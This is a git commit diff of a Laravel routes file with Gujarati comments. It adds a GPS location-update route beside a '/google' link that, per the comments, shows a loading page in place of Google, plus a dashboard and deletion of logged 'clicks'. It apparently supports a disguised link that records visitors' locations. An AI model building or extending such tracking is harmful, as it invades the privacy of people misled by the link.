404653f1c0d2bdbb1977fbaf98d9f8b31defd78a
Gaurav Patoliya <gauravpatoliya19@gmail.com>
2026-04-19 17:31:51 +0530

    Update routes with comments and new location update route

--- routes/web.php
+++ routes/web.php
@@ -8,15 +8,19 @@ Route::get('/', function () {
     return "App Working";
 });
 
-// ૧. ટ્રેકિંગ માટેનો રૂટ (આ હવે સીધું ગૂગલ પર નહીં જાય, પહેલા tracking_page બતાવશે)
+// ૧. ટ્રેકિંગ માટેનો રૂટ
+// યુઝર આ લિંક ખોલશે એટલે TrackController નો track ફંક્શન લોડિંગ પેજ બતાવશે
 Route::get('/google', [TrackController::class, 'track'])->name('track');
 
+// ૨. GPS લોકેશન અપડેટ કરવા માટેનો નવો રૂટ (નવી ફિક્સ)
+// આ રૂટ JavaScript (AJAX) દ્વારા ડેટા લેવા માટે વપરાશે
+Route::post('/update-location', [TrackController::class, 'updateLocation'])->name('location.update');
 
-// ડેશબોર્ડ રૂટ
+// ૩. ડેશબોર્ડ રૂટ
 Route::get('/dashboard', [TrackController::class, 'dashboard'])->name('dashboard');
 
-// સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
+// ૪. સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
 Route::delete('/click/delete/{id}', [TrackController::class, 'destroy'])->name('click.delete');
 
-// બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
+// ૫. બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
 Route::delete('/clicks/delete-all', [TrackController::class, 'destroyAll'])->name('clicks.deleteall');
